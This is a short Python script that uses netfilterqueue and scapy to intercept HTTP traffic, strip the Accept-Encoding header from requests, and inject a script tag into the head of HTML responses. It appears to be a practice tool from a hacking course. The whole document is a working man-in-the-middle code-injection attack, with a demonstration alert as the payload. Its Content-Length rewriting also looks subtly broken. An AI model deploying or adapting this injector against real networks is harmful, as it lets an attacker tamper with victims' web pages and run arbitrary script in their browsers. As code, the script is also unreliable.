import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet,load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	

def process_packet(packet):
	scapypacket = scapy.IP(packet.get_payload())
	if scapypacket.haslayer(scapy.Raw):
		load = scapypacket[scapy.Raw].load
		if scapypacket[scapy.TCP].dport == 80 :
			print("http req")
			load = re.sub( b"Accept-Encoding:.*?\\r\\n" , b"" , load)

		elif scapypacket[scapy.TCP].sport == 80:
			print("http res")
			injectcode = b"<head><script>alert('hacked');</script>"
			load = load.replace(b"<head>",b"<head>" + injectcode )
			contentsearch = re.search(b"(?:Content-Length:\s)(\d*)",load)
			if contentsearch and b"text/html" in load :
				conlength = contentsearch.group(1)
				newconlen = int(conlength) + len(str(injectcode))
				load = load.replace( conlength, bytes(newconlen))	
				print(newconlen)
			
		if load != scapypacket[scapy.Raw].load:
			new_packet = set_load(scapypacket, load)	
			packet.set_payload(bytes(new_packet))

	packet.accept()
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
